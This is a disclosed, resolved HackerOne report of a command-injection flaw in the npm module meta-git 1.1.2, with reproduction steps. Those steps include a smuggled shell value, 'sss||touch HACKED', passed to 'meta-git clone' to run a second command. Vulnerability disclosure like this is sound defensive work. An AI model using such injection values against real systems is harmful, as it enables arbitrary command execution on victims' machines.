# [M] [meta-git] RCE via insecure command formatting

## Summary
Severity: Medium (CVSS 6.2)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: mik317
State: resolved
Disclosed: 2020-01-11T11:57:31.528Z
Source: https://hackerone.com/reports/728040

## Details
I would like to report a `RCE` issue in the `meta-git` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `meta-git`
**version:** `1.1.2`
**npm page:** `https://www.npmjs.com/package/meta-git`

## Module Description
> git plugin for meta

## Module Stats
[~60] downloads in the last day
[429] downloads in the last week
[~2k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49

## Steps To Reproduce:
1. Create a new directory and insert some test files:

```bash
mkdir tests
cd tests
touch test
touch secret
touch files
```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i meta-git -g # Install affected module
meta-git clone 'sss||touch HACKED' # *HACKED* file is created
```
1. Recheck the files: now `HACKED` has been created :) {F624209}


_Trimmed to 38 lines — full report: https://hackerone.com/reports/728040_
